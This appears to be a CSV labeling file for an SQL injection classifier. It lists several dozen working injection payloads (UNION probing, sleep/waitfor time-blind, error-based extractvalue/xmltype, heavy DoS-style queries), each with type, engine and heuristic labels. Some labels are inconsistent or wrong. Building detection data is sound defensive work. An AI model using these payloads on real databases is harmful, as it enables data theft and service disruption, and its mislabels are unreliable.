payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"1 ) ) as nxdf where 1696 = 1696 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,benchmark() for time blind,KEEP,,time_blind,mysql,662,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1 ) ) as nxdf where 1696 = 1696 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #"
select case when 6229 = 2077 then 1 else null end--,boolean_blind,generic,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,generic,663,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select case when 6229 = 2077 then 1 else null end--
select ( case when ( 5569 = 9390 ) then 5569 else 1/ ( select 0 ) end ) --,boolean_blind,generic,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,generic,664,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select ( case when ( 5569 = 9390 ) then 5569 else 1/ ( select 0 ) end ) --
1' ) where 1363 = 1363,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,665,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) where 1363 = 1363
"1 ) union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,666,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 ) union all select null,null,null,null,null,null,null,null,null--"
"1' ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( 'wqme' = 'wqme",error_based,mysql,0.85,extractvalue() with procedure analyse,KEEP,,error_based,mysql,667,error_based,mysql,Pattern match: 'extractvalue (' → error_based (P4); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( 'wqme' = 'wqme"
"-4373'+ ( select 'rlht' where 2285 = 2285 union all select 2285,2285,2285#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,668,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-4373'+ ( select 'rlht' where 2285 = 2285 union all select 2285,2285,2285#"
1 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) -- paxv,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,669,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) -- paxv
"1"" rlike ( select ( case when ( 2724 = 4757 ) then 1 else 0x28 end ) ) and ""cmsa"" = ""cmsa",boolean_blind,generic,0.8,rlike() for boolean blind,KEEP,,boolean_blind,generic,670,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)","1"" rlike ( select ( case when ( 2724 = 4757 ) then 1 else 0x28 end ) ) and ""cmsa"" = ""cmsa"
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and 'lckw' = 'lckw",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,671,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and 'lckw' = 'lckw"
1 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ),boolean_blind,generic,0.8,rlike() for boolean blind,KEEP,,boolean_blind,generic,672,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) )
"-1891' in boolean mode ) union all select 6680,6680,6680,6680,6680,6680,6680,6680#",union_based,generic,0.85,UNION in boolean mode for union-based,KEEP,,union_based,generic,673,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-1891' in boolean mode ) union all select 6680,6680,6680,6680,6680,6680,6680,6680#"
"1%"" ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( ""%"" = """,boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,674,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1%"" ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( ""%"" = """
"1"" ) ) as frsd where 6475 = 6475 union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,675,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" ) ) as frsd where 6475 = 6475 union all select null,null,null,null,null,null,null,null,null,null--"
"1"" ) where 9861 = 9861",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,676,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) where 9861 = 9861"
"1"" ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ""pqsp"" = ""pqsp",boolean_blind,postgresql,0.8,CAST for PostgreSQL blind,KEEP,,boolean_blind,postgresql,677,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ""pqsp"" = ""pqsp"
"1' ) where 3262 = 3262 union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,678,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' ) where 3262 = 3262 union all select null,null,null,null,null,null,null,null,null,null#"
"-2027%"" ) union all select 2048,2048,2048,2048,2048,2048,2048,2048#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,679,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-2027%"" ) union all select 2048,2048,2048,2048,2048,2048,2048,2048#"
1 where 3354 = 3354,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,680,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 where 3354 = 3354
"-3853"" ) where 4626 = 4626 union all select 4626,4626,4626--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,681,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3853"" ) where 4626 = 4626 union all select 4626,4626,4626--"
"1'+ ( select 'vwzp' where 2729 = 2729 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,682,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1'+ ( select 'vwzp' where 2729 = 2729 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --"
-3096' or 3821 = 5539 and 'zrth' = 'zrth,boolean_blind,generic,0.8,AND comparison for blind,KEEP,,boolean_blind,generic,683,boolean_blind,generic,Pattern match: 'or 3821 = 5539' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-3096' or 3821 = 5539 and 'zrth' = 'zrth
1 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) # lwfs,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,684,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) # lwfs
"1 union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,685,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 union all select null,null,null,null,null,null,null,null,null--"
"-5230"" ) or elt ( 1032 = 1032,3623 ) and ( ""aivb"" like ""aivb",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,686,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"-5230"" ) or elt ( 1032 = 1032,3623 ) and ( ""aivb"" like ""aivb"
( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( 'nbzf' like 'nbzf,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,687,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( 'nbzf' like 'nbzf
"-8349 ) union all select 8126,8126#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,688,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-8349 ) union all select 8126,8126#"
"1"" ) where 4567 = 4567 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,689,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1"" ) where 4567 = 4567 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --"
"1"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",error_based,oracle,0.9,xmltype() for Oracle error-based,KEEP,,error_based,oracle,690,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal,"1"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )"
"1' ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( 'rxxb' = 'rxxb",error_based,mysql,0.85,extractvalue() with procedure analyse,KEEP,,error_based,mysql,691,error_based,mysql,Pattern match: 'extractvalue (' → error_based (P4); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( 'rxxb' = 'rxxb"
1 ) where 2232 = 2232,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,692,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) where 2232 = 2232
"-3637"" or ( 8459 = 8459 ) *4906",boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,693,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-3637"" or ( 8459 = 8459 ) *4906"
1' ) ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.9,pg_sleep() for time blind,KEEP,,time_blind,postgresql,694,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,1' ) ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --
"iif ( 2452 = 8999,1,1/0 )",boolean_blind,mssql,0.85,iif() for MSSQL boolean blind,KEEP,,boolean_blind,mssql,695,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"iif ( 2452 = 8999,1,1/0 )"
1' ) as bihs where 4197 = 4197,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,696,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) as bihs where 4197 = 4197
"-7531' ) union all select 3072,3072,3072,3072,3072,3072,3072--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,697,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-7531' ) union all select 3072,3072,3072,3072,3072,3072,3072--"
"1 ) ) ) union all select null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,698,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 ) ) ) union all select null,null,null,null,null,null--"
"waitfor delay '0:0:5' and ( ""ludp"" like ""ludp",time_blind,mssql,0.9,waitfor delay for MSSQL time blind,KEEP,,time_blind,mssql,699,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,"waitfor delay '0:0:5' and ( ""ludp"" like ""ludp"
-2981 ) ) or ( 8459 = 8459 ) *4906 and ( ( 4202 = 4202,boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,700,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,-2981 ) ) or ( 8459 = 8459 ) *4906 and ( ( 4202 = 4202
"-5320 where 8051 = 8051 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",error_based,oracle,0.9,ctxsys.drithsx for Oracle error-based,KEEP,,error_based,oracle,701,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"-5320 where 8051 = 8051 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"
1 where 5691 = 5691 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,702,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1 where 5691 = 5691 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --
"select sleep ( 5 ) and ""cyrb"" = ""cyrb",time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,703,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"select sleep ( 5 ) and ""cyrb"" = ""cyrb"
1' ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( 'jhlj' = 'jhlj,error_based,oracle,0.9,utl_inaddr for Oracle error-based,KEEP,,error_based,oracle,704,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,1' ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( 'jhlj' = 'jhlj
1 ) as oknr where 3228 = 3228,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,705,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) as oknr where 3228 = 3228
"1"" ) ) ) rlike sleep ( 5 ) and ( ( ( ""eefg"" = ""eefg",time_blind,generic,0.9,sleep() with rlike for time blind,KEEP,,time_blind,generic,706,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)","1"" ) ) ) rlike sleep ( 5 ) and ( ( ( ""eefg"" = ""eefg"
"1"" ) as gtpi where 8100 = 8100 and make_set ( 2678 = 9169,9169 ) --",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,707,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) as gtpi where 8100 = 8100 and make_set ( 2678 = 9169,9169 ) --"
"1"" ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""lxue"" like ""lxue",time_blind,sqlite,0.85,randomblob() for time blind,KEEP,,time_blind,sqlite,708,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1"" ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""lxue"" like ""lxue"
"-8490 ) ) union all select 6910,6910,6910,6910,6910,6910#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,709,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-8490 ) ) union all select 6910,6910,6910,6910,6910,6910#"
"1 ) ) ) union all select null,null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,710,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 ) ) ) union all select null,null,null,null,null,null,null--"
"1"" union all select null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,711,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" union all select null,null,null,null--"
select case when 1892 = 3646 then 1 else null end--,boolean_blind,generic,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,generic,712,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select case when 1892 = 3646 then 1 else null end--
"1"" rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ""tbbk"" like ""tbbk",boolean_blind,generic,0.8,rlike() for boolean blind,KEEP,,boolean_blind,generic,713,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)","1"" rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ""tbbk"" like ""tbbk"
"-6747"" or 9323 = 9323#",boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,714,boolean_blind,generic,Pattern match: 'or 9323 = 9323' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-6747"" or 9323 = 9323#"
-1219' ) or 5592 = 4835,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,715,boolean_blind,generic,Pattern match: 'or 5592 = 4835' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-1219' ) or 5592 = 4835
"1"" ) ) ) union all select null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,716,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" ) ) ) union all select null,null,null,null,null#"
"-8566"" ) as hnch where 3418 = 3418 union all select 3418,3418,3418,3418,3418,3418,3418#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,717,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-8566"" ) as hnch where 3418 = 3418 union all select 3418,3418,3418,3418,3418,3418,3418#"
"-2248'+ ( select wuow where 4421 = 4421 union all select 4421,4421,4421,4421,4421,4421--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,718,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-2248'+ ( select wuow where 4421 = 4421 union all select 4421,4421,4421,4421,4421,4421--"
1 ) as mtda where 3951 = 3951,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,719,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) as mtda where 3951 = 3951
1' ) where 7908 = 7908 or sleep ( 5 ) --,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,720,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1' ) where 7908 = 7908 or sleep ( 5 ) --
"-1438 where 6759 = 6759 union all select 6759,6759#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,721,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-1438 where 6759 = 6759 union all select 6759,6759#"
"iif ( 9190 = 5059,1,1/0 )",boolean_blind,mssql,0.85,iif() for MSSQL boolean blind,KEEP,,boolean_blind,mssql,722,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"iif ( 9190 = 5059,1,1/0 )"
"1"" ) ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( ""oohx"" like ""oohx",time_blind,sqlite,0.85,randomblob() for time blind,KEEP,,time_blind,sqlite,723,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1"" ) ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( ""oohx"" like ""oohx"
1' ) and ( 1414 = 4775 ) *4775 and ( 'mlmw' = 'mlmw,boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,724,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,1' ) and ( 1414 = 4775 ) *4775 and ( 'mlmw' = 'mlmw
"select count ( * ) from generate_series ( 1,5000000 ) and ( ( 'wmoo' like 'wmoo",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,725,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"select count ( * ) from generate_series ( 1,5000000 ) and ( ( 'wmoo' like 'wmoo"
"1' ) where 9221 = 9221 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",boolean_blind,generic,0.75,SELECT IF for boolean blind,KEEP,,boolean_blind,generic,726,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) where 9221 = 9221 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --"
"1 ) as qjbd where 2808 = 2808 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,727,boolean_blind,mysql,generic SQL keywords without specific signal,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1 ) as qjbd where 2808 = 2808 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --"
1' or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and 'dogx' = 'dogx,time_blind,postgresql,0.9,pg_sleep() for time blind,KEEP,,time_blind,postgresql,728,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,1' or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and 'dogx' = 'dogx
